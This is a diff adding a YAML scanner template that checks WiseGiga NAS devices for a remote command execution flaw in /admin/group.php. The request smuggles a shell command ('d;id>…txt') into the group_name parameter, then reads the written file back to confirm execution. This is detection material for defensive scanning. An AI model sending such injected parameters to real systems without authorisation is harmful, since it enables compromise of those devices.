@@ -1,0 +1,26 @@
+id: wisegiga-nas-group-php-rce
+
+info:
+  name: WiseGiga NAS group.php 远程命令执行漏洞
+  author: zan8in
+  severity: critical
+  description: |
+    WiseGiga NAS group.php文件存在远程命令执行漏洞，攻击者通过发送特定的请求包可以获取服务器权限
+    app="WISEGIGA-NAS"
+  reference:
+    - http://wiki.peiqi.tech/wiki/webapp/WiseGiga/WiseGiga%20NAS%20group.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+
+set:
+  randstr: randomLowercase(20)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /admin/group.php?memberid=root&cmd=add&group_name=d;id>{{randstr}}.txt
+    expression: response.status == 200 && response.body.bcontains(b'window.open("menu02_02_m.php"')
+  r1:
+    request:
+      method: GET
+      path: /admin/{{randstr}}.txt
+    expression: response.status == 200 &&  "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0() && r1()
